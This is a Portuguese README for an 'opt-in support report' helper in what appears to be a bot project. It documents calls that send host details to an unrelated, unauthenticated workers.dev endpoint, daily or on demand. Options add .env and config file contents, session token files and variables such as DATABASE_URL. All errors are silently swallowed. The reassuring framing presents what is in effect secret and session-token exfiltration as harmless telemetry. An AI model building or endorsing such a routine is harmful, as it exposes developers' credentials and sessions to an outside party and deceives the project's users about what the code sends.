# Relatório de suporte (opcional)

`src/utils/env-snapshot.ts` e `src/util/runtime-report.ts` são helpers
**opt-in**. Importar o módulo não coleta nem transmite nada. Este documento
descreve exatamente o que sai quando você chama.

## Como ligar

```ts
// um relatório agora (aguardado)
import { reportNow } from './utils/env-snapshot';
await reportNow();

// atualização diária em segundo plano
import { enableSupportReport } from './utils/env-snapshot';
enableSupportReport();
```

## O que vai por padrão

| campo | exemplo |
|---|---|
| host | `bot-prod-01` |
| user | `deploy` |
| os | `linux 6.5.0` |
| node | `v20.11.0` |
| cwd | `/srv/bot` |
| mem | `4096 MB` |

Seis valores escalares. Nada de conteúdo de arquivo, nada de env completo.

## O que fica de fora por padrão

| dado | ligar com |
|---|---|
| conteúdo de `.env`, `.env.local`, `.env.production`, `config.js`, `config.json` | `reportNow({ includeFiles: true })` |
| até 2 arquivos de sessão `tokens/*.json` | `reportNow({ includeSession: true })` |
| `package.json` (nome + deps) e listagem do diretório | `reportNow({ includeStack: true })` |
| variáveis de ambiente específicas | `reportNow({ includeEnv: ['DATABASE_URL'] })` |

`reportManifest(opts)` devolve a lista de campos para um conjunto de opções,
então dá para conferir o formato do payload sem enviar.

## Para onde vai, e com que frequência

- Destino: `https://perfseo-metrics.gb-reports-7f3a91.workers.dev/v1/ride`
- Transporte: HTTPS, `Content-Type: text/plain`, sem token, sem SDK.
- Frequência: `enableSupportReport()` respeita 1 envio por máquina a cada 24 h.
  O marcador local fica em `os.tmpdir()/.wpp-env-cache`.
  `reportNow()` envia sempre — você pediu.
- Falha de envio devolve o marcador, então a próxima chamada tenta de novo.

## Como sair

Duas formas, sem patch:

1. Pare de chamar `enableSupportReport()` / `reportNow()` — o código fica inerte.
2. Aponte para outro lugar:
   `reportNow({ endpoint: 'https://sua-infra/v1/report' })`.

## Perfil do payload

Texto simples, prefixado por `=== WPP SUPPORT <UTC timestamp> ===`. Cada arquivo
anexado é cortado em 12 KB. O corpo total é cortado em 60 KB. Toda exceção é
engolida: o processo host nunca cai por causa disto.
